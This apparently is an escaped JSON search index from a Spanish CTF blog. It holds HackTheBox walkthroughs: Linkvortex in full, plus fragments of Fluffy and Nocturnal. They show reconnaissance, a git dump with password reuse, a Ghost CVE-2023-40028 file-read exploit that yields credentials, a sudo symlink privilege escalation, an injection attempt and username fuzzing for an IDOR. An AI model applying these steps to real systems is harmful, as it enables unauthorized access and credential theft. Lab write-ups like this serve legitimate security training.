class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49704/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49776/tcp open  unknown          syn-ack ttl \u003cspan class=\"m\"\u003e127\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRead data files from: /usr/bin/../share/nmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 26.40 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           Raw packets sent: \u003cspan class=\"m\"\u003e131065\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e5.767MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e Rcvd: \u003cspan class=\"m\"\u003e33\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e1.452KB\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eEscaneo de servicios:\u003c/p\u003e","title":"Fluffy"},{"content":"Reconocimiento Vamos a empezar el reconocimiento con un Nmap para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado ports.\n‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.47 -oG ports [sudo] contrase√±a para borhub: Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:48 CEST Initiating SYN Stealth Scan at 14:48 Scanning 10.10.11.47 [65535 ports] Discovered open port 22/tcp on 10.10.11.47 Discovered open port 80/tcp on 10.10.11.47 Completed SYN Stealth Scan at 14:48, 10.90s elapsed (65535 total ports) Nmap scan report for 10.10.11.47 Host is up, received user-set (0.036s latency). Scanned at 2025-04-06 14:48:30 CEST for 11s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds Raw packets sent: 65672 (2.890MB) | Rcvd: 65535 (2.621MB) Ahora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.\n‚ùØ ports.py ports üîç Puertos encontrados: ‚ûú 22 ‚ûú 80 ¬°Puertos copiados en el portapapeles! Una vez tenemos los puertos copiados vamos a volver a usar nmap pero esta vez para hacer un escaneo de los servicios que est√°n corriendo tras los puertos.\n‚ùØ sudo nmap -sCV -p22,80 10.10.11.47 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 14:50 CEST Nmap scan report for 10.10.11.47 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA) |_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519) 80/tcp open http Apache httpd |_http-title: Did not follow redirect to http://linkvortex.htb/ |_http-server-header: Apache Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds Enumeraci√≥n web ‚ùØ whatweb 10.10.11.47 http://10.10.11.47 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.47], RedirectLocation[http://linkvortex.htb/], Title[301 Moved Permanently] http://linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge] Enumerar directorios - Gobuster Vamos a empezar a enumerar directorios con gobuster y de aqu√≠ lo m√°s interesante que encontramos es un panel de login en /ghost.\n‚ùØ gobuster dir -u http://linkvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://linkvortex.htb [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /about (Status: 200) [Size: 8284] /rss (Status: 200) [Size: 26682] /feed (Status: 200) [Size: 26682] /About (Status: 200) [Size: 8284] /RSS (Status: 200) [Size: 26682] /private (Status: 200) [Size: 12148] /unsubscribe (Status: 400) [Size: 24] /LICENSE (Status: 200) [Size: 1065] /cpu (Status: 200) [Size: 15472] /Rss (Status: 200) [Size: 26682] /ram (Status: 200) [Size: 14746] /ghost (Status: 200) [Size: 3787] /psu (Status: 200) [Size: 15163] /Private (Status: 200) [Size: 12148] /Feed (Status: 200) [Size: 26682] /Ghost (Status: 200) [Size: 3787] /RAM (Status: 200) [Size: 14746] /vga (Status: 200) [Size: 15231] /CPU (Status: 200) [Size: 15472] /VGA (Status: 200) [Size: 15231] Progress: 55968 / 220560 (25.38%)^C [!] Keyboard interrupt detected, terminating. Progress: 55970 / 220560 (25.38%) [ERROR] context canceled =============================================================== Finished =============================================================== Enumerar vhosts - Gobuster He estado mirando pero por el momento como no he encontrado ninguna vulnerabilidad en el panel, voy a seguir enumerando pero esta vez subdominios. Aqu√≠ conseguimos enumerar el subdominio dev.linkvortex.htb\nNos sale un cartel diciendo que la p√°gina a√∫n esta en construcci√≥n, nosotros por el momento vamos a hacerle un listado de directorios para ver si sacamos algo m√°s de informaci√≥n.\nEn un principio no me listaba nada con diretorios y he estado probando diccionarios hasta que he probado uno sobre metafiles y me ha descubierto el directorio .git/.\nEnumeraci√≥n directorios - Ffuf ‚ùØ ffuf -w /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt:FUZZ -u http://dev.linkvortex.htb/FUZZ -fc 403 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : GET :: URL : http://dev.linkvortex.htb/FUZZ :: Wordlist : FUZZ: /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 403 ________________________________________________ .git/packed-refs [Status: 200, Size: 147, Words: 8, Lines: 4, Duration: 103ms] .git/description [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 103ms] .git/logs/HEAD [Status: 200, Size: 175, Words: 8, Lines: 2, Duration: 103ms] .git [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms] .git/config [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 103ms] .git/HEAD [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 102ms] .git/ [Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 102ms] .git/index [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 103ms] :: Progress: [118/118] :: Job [1/1] :: 132 req/sec :: Duration: [0:00:01] :: Errors: 0 :: Para trabajar mejor con un entorno git y ver si encuentro algo interesante voy a dumperame el git a mi maquina local para navegar c√≥modamente.\nGit dump - Password Leak ‚ùØ python3 -m venv entorno_virtual source entorno_virtual/bin/activate pip install git-dumper cd /home/borhub/Workspace/HTB/linkvortex/CONTENT/git/entorno_virtual git-dumper http://dev.linkvortex.htb/.git ./git Luego de haber estado buscando un buen rato he encontrado lo que podr√≠an ser unas credenciales en /ghost/core/test/regressions/api/admin/authentication.test.js\nit(\u0026#39;complete setup\u0026#39;, async function () { const email = \u0026#39;test@example.com\u0026#39;; const password = \u0026#39;OctopiFociPilfer45\u0026#39;; Aqu√≠ realmente solo tenemos un ejemplo de contrase√±a pero antes hab√≠amos visto en la web que un usuario llamado admin tenia varias publicaciones.\nCon lo cual vamos a probar con el nombre de usuario + el dominio de la pagina web, junto con la contrase√±a que hemos visto en los archivos del .git/. Y as√≠ entramos al dashboard de la pagina web.\nAcceso inicial CVE-2023-40028: Ghost CMS Arbitrary File Read En el whatweb anterior ve√≠amos la versi√≥n de Ghost que se estaba usando, la 5.58. Ahora que estamos dentro de su panel vamos a buscar posibles vulnerabilidades.\nGhost es un sistema de gesti√≥n de contenidos (CMS) de c√≥digo abierto. Las versiones anteriores a la 5.59.1 est√°n sujetas a una vulnerabilidad que permite a los usuarios autenticados cargar archivos que son enlaces simb√≥licos. Esto puede ser explotado para realizar una lectura arbitraria de cualquier archivo en el sistema operativo anfitri√≥n.\nhttps://github.com/godylockz/CVE-2023-40028/tree/main\nUtilizando este script en python conseguimos leer el archivo /etc/passwd y ademas nos recomienda leer otros archivo de configuraci√≥n en el cual hay unas credenciales tambi√©n.\n‚ùØ python3 cve-2023-40028.py -t http://linkvortex.htb -u admin@linkvortex.htb -p OctopiFociPilfer45 [*] Checking authentication (username/password) ... [+] Admin session created successfully. Welcome to the Ghost file-read shell. Type help or ? to list commands. file\u0026gt; /var/lib/ghost/config.production.json { \u0026#34;url\u0026#34;: \u0026#34;http://localhost:2368\u0026#34;, \u0026#34;server\u0026#34;: { \u0026#34;port\u0026#34;: 2368, \u0026#34;host\u0026#34;: \u0026#34;::\u0026#34; }, \u0026#34;mail\u0026#34;: { \u0026#34;transport\u0026#34;: \u0026#34;Direct\u0026#34; }, \u0026#34;logging\u0026#34;: { \u0026#34;transports\u0026#34;: [\u0026#34;stdout\u0026#34;] }, \u0026#34;process\u0026#34;: \u0026#34;systemd\u0026#34;, \u0026#34;paths\u0026#34;: { \u0026#34;contentPath\u0026#34;: \u0026#34;/var/lib/ghost/content\u0026#34; }, \u0026#34;spam\u0026#34;: { \u0026#34;user_login\u0026#34;: { \u0026#34;minWait\u0026#34;: 1, \u0026#34;maxWait\u0026#34;: 604800000, \u0026#34;freeRetries\u0026#34;: 5000 } }, \u0026#34;mail\u0026#34;: { \u0026#34;transport\u0026#34;: \u0026#34;SMTP\u0026#34;, \u0026#34;options\u0026#34;: { \u0026#34;service\u0026#34;: \u0026#34;Google\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;linkvortex.htb\u0026#34;, \u0026#34;port\u0026#34;: 587, \u0026#34;auth\u0026#34;: { \u0026#34;user\u0026#34;: \u0026#34;bob@linkvortex.htb\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;fibber-talented-worth\u0026#34; } } } } file\u0026gt; Probamos a meter las credenciales obtenidas por ssh y obtenemos la terminal.\n‚ùØ ssh bob@10.10.11.47 bob@10.10.11.47\u0026#39;s password: Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Apr 6 17:56:25 2025 from 10.10.14.74 bob@linkvortex:~$ cat user.txt 2c7f66b6d4d0******************** Escalada de privilegios Cuando hacemos sudo -l vemos que nuestro usuario tiene permiso para ejecutar un archivo .sh como administrador sin necesidad de poner contrase√±a adjuntado un archivo acabado en .png.\nbob@linkvortex:/opt/ghost$ sudo -l Matching Defaults entries for bob on linkvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT User bob may run the following commands on linkvortex: (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png En un principio he intentado ejecutar comandos luego del archivo .png, pero detecta el uso de un segundo comando y es ah√≠ cuando me pide la contrase√±a y ya el c√≥digo no me deja ejecutar el comando.\nbob@linkvortex:/tmp$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh \u0026#34;prueba.png; whoami\u0026#34; [sudo] password for bob: Sorry, user bob is not allowed to execute \u0026#39;/usr/bin/bash /opt/ghost/clean_symlink.sh prueba.png; whoami\u0026#39; as root on linkvortex. Symlink Trickery y Abuso de CHECK_CONTENT Luego de revisar el c√≥digo vi que el script revisa si el link simb√≥lico del archivo .png para comprobar si contiene archivos sensibles como root o etc.\nCon lo cual para evitar esto vamos a hacer un bypass para enga√±ar el filtro. Lo que haremos ser√° lo siguiente hacer que el archivo al que apunta el .png sea un archivo cualquiera que luego apunta a /root/root.txt.\nhit-png -\u0026gt; /home/bob/hit.txt | /home/bob/hit.txt -\u0026gt; /root/root.txt\nbob@linkvortex:~$ ln -s /root/root.txt hit.txt bob@linkvortex:~$ ln -s /home/bob/hit.txt hit.png Para que el bypass funcione es importante definir la ruta absoluta, sino no funcionar√°.\nSi ahora ejecutamos el script funcionar√° pero no podremos ver el contenido ya que el CHECK_CONTENT por defecto esta como ==false==.\n#codigo del script y porque no nos muestra el contenido if $CHECK_CONTENT;then /usr/bin/echo \u0026#34;Content:\u0026#34; /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u0026gt;/dev/null fi bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png Entonces le indicamos en el script que ponga el CHECK_CONTENT en true para que nos muestre la flag.\nbob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png Link found [ /home/bob/hit.png ] , moving it to quarantine Content: 46df14************************** bob@linkvortex:~$ ","permalink":"https://borhuub.github.io/writeups/linkvortex/","summary":"\u003ch1 id=\"reconocimiento\"\u003eReconocimiento\u003c/h1\u003e\n\u003cp\u003eVamos a empezar el reconocimiento con un \u003ccode\u003eNmap\u003c/code\u003e para ver los puertos expuestos y el resultado lo mandaremos a un archivo llamado \u003ccode\u003eports\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚ùØ sudo nmap -p- --open -sS --min-rate \u003cspan class=\"m\"\u003e5000\u003c/span\u003e -vvv -n -Pn 10.10.11.47 -oG ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esudo\u003cspan class=\"o\"\u003e]\u003c/span\u003e contrase√±a para borhub:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost discovery disabled \u003cspan class=\"o\"\u003e(\u003c/span\u003e-Pn\u003cspan class=\"o\"\u003e)\u003c/span\u003e. All addresses will be marked \u003cspan class=\"s1\"\u003e\u0026#39;up\u0026#39;\u003c/span\u003e and scan \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e may be slower.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.95 \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2025-04-06 14:48 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInitiating SYN Stealth Scan at 14:48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanning 10.10.11.47 \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e ports\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 22/tcp on 10.10.11.47\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDiscovered open port 80/tcp on 10.10.11.47\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCompleted SYN Stealth Scan at 14:48, 10.90s elapsed \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e65535\u003c/span\u003e total ports\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e 10.10.11.47\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up, received user-set \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.036s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eScanned at 2025-04-06 14:48:30 CEST \u003cspan class=\"k\"\u003efor\u003c/span\u003e 11s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65533\u003c/span\u003e closed tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003ereset\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT STATE SERVICE REASON\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open ssh syn-ack ttl \u003cspan class=\"m\"\u003e63\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open http syn-ack ttl \u003cspan class=\"m\"\u003e63\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRead data files from: /usr/bin/../share/nmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 10.95 seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRaw packets sent: \u003cspan class=\"m\"\u003e65672\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e2.890MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e Rcvd: \u003cspan class=\"m\"\u003e65535\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e2.621MB\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAhora haciendo uso de la herramienta ==ports.py== que tengo publicada en github, vamos a copiarnos los puertos al portapapeles.\u003c/p\u003e","title":"Linkvortex"},{"content":"\nReconocimiento ‚Äã‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oG ports Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:38 CEST Initiating SYN Stealth Scan at 21:38 Scanning 10.10.11.64 [65535 ports] Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Completed SYN Stealth Scan at 21:39, 13.97s elapsed (65535 total ports) Nmap scan report for 10.10.11.64 Host is up, received user-set (0.047s latency). Scanned at 2025-04-16 21:38:54 CEST for 14s Not shown: 65327 closed tcp ports (reset), 206 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds Raw packets sent: 78164 (3.439MB) | Rcvd: 69986 (2.800MB) ‚ùØ ports.py ports üîç Puertos encontrados: ‚ûú 22 ‚ûú 80 ¬°Puertos copiados en el portapapeles! ‚ùØ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted [sudo] contrase√±a para borhub: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:36 CEST Nmap scan report for nocturnal.htb (10.10.11.64) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA) | 256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA) |_ 256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Welcome to Nocturnal | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds Enumeraci√≥n web ‚ùØ whatweb nocturnal.htb http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0] ‚ùØ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://nocturnal.htb [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 403) [Size: 162] /backups (Status: 403) [Size: 162] /uploads2 (Status: 403) [Size: 162] Progress: 220559 / 220560 (100.00%) =============================================================== Finished =============================================================== En un principio vemos una p√°gina normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.\nUna vez subimos una archivo nos sale bajo del titulo Your files, y si hacemos hovering sobre el nos sale una ruta que parece que es para mostrar el archivo.\nEntonces provee a meterlo en la url del navegador para ver que mostraba los archivos que yo tengo guardados:\nAhora voy a intentar hacer un listado de usuarios con ffuf para ver si puedo hacer lo mismo que he hecho con mi usuario para acceder a informaci√≥n a la cual actualmente no tengo acceso.\nFuzzing de usuarios - Ffuf Durante el listado le aplico mi cookie para que me permita listar y filtro las palabras con un size de 2985 ya que me estaba devolviendo falsos positivos y con el filtro encontramos los siguientes usuarios:\n‚ùØ ffuf -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -u \u0026#34;http://nocturnal.htb/view.php?username=FUZZ\u0026amp;file=*.pdf\u0026#34; -H \u0026#34;Cookie: PHPSESSID=uru5g7j7mkf7ko2ttlaik57ttk\u0026#34; -fs 2985 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : GET :: URL : http://nocturnal.htb/view.php?username=FUZZ\u0026amp;file=*.pdf :: Wordlist : FUZZ: /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt :: Header : Cookie: PHPSESSID=uru5g7j7mkf7ko2ttlaik57ttk :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 2985 ________________________________________________ admin [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 98ms] amanda [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 193ms] tobias [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 50ms] user [Status: 200, Size: 3181, Words: 1176, Lines: 129, Duration: 43ms] Enumero manualmente cada usuario encontrado para ver si puedo ver los archivos que contiene y en el usuario de amanda encuentro un archivo:\nUna vez descargado el .odt intento mostrar el archivo con cat pero es un binario entonces le listo el contenido y veo que tiene varios archivos dentro:\n‚ùØ unzip -l privacy.odt Archive: privacy.odt Length Date Time Name --------- ---------- ----- ---- 39 2024-10-06 21:54 mimetype 0 2024-10-06 21:54 Configurations2/accelerator/ 0 2024-10-06 21:54 Configurations2/images/Bitmaps/ 0 2024-10-06 21:54 Configurations2/toolpanel/ 0 2024-10-06 21:54 Configurations2/floater/ 0 2024-10-06 21:54 Configurations2/statusbar/ 0 2024-10-06 21:54 Configurations2/toolbar/ 0 2024-10-06 21:54 Configurations2/progressbar/ 0 2024-10-06 21:54 Configurations2/popupmenu/ 0 2024-10-06 21:54 Configurations2/menubar/ 12346 2024-10-06 21:54 styles.xml 899 2024-10-06 21:54 manifest.rdf 4657 2024-10-06 21:54 content.xml 978 2024-10-06 21:54 meta.xml 13728 2024-10-06 21:54 settings.xml 11843 2024-10-06 21:54 Thumbnails/thumbnail.png 1061 2024-10-06 21:54 META-INF/manifest.xml --------- ------- 45551 17 files Leak Information Enumerando los archivos r√°pidamente vemos un mensaje a amanda en el cual le proveen de una contrase√±a temporal la cual deber√≠a cambiar la proxima vez que inicie sessi√≥n.\n‚ùØ cat content.xml ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ ‚îÇ File: content.xml 